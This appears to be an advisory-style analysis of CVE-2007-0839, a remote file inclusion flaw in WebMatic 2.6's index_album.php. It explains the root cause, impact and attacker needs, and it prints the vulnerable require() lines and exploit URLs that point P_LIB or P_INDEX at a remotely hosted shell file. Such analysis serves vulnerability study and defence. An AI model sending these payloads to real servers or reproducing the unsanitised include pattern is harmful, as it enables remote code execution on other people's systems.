Based on the provided information, here's an analysis of CVE-2007-0839:

**Root Cause of Vulnerability:**
The vulnerability lies in the `index_album.php` script of WebMatic 2.6. The script uses user-controlled parameters `P_LIB` and `P_INDEX` in `require()` statements without proper sanitization.

**Weaknesses/Vulnerabilities Present:**
- **Remote File Inclusion (RFI):** The application directly includes the content specified in the `P_LIB` and `P_INDEX` parameters via `require()` statements, without validation.

**Impact of Exploitation:**
- **Arbitrary Code Execution:** An attacker can inject malicious code by specifying a URL to a file containing PHP code within the `P_LIB` or `P_INDEX` parameters. This allows the attacker to execute arbitrary code on the server running the vulnerable application.

**Attack Vectors:**
- **HTTP GET Request:** The attacker crafts a malicious HTTP GET request to the vulnerable `index_album.php` script, specifying the URL of a malicious script in either the `P_LIB` or `P_INDEX` parameter.

**Required Attacker Capabilities/Position:**
- **Network Access:** The attacker needs network access to the server hosting the vulnerable WebMatic application.
- **Knowledge of Vulnerable Path:** The attacker needs to know the path to the vulnerable `index_album.php` script.
- **Ability to host a malicious file:** The attacker needs to host a file containing PHP code that they wish to execute on the target server.

**Technical Details:**

The vulnerable code snippet is described as follows:
```
Error1 :  require($P_LIB."lib_album.php");
Error2 :  require($P_INDEX."page_album.inc");
```
The exploit examples are:
```
http://[target]/[path]/core/index/index_album.php?P_LIB=[Shell]
http://[target]/[path]/core/index/index_album.php?P_INDEX=[Shell]

Example1 : [Path]/core/index/index_album.php?P_LIB=http://[path]/shell.txt
Example2 : [Path]/core/index/index_album.php?P_INDEX=http://[path]/shell.txt
```
The `require()` function in PHP will fetch and execute the code from the provided path or URL, which will allow arbitrary code execution on the server.
